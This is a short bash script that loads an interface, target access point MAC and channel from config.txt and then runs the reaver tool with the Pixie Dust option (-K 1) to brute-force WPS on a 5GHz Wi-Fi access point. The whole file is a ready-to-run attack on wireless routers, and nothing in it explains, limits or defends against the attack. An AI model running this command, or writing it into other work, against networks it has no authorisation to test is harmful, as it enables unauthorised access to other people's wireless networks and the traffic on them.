#!/bin/bash

source config.txt

reaver -i $interface -b $ap_mac -c $channel -5 -K 1 -N -vv
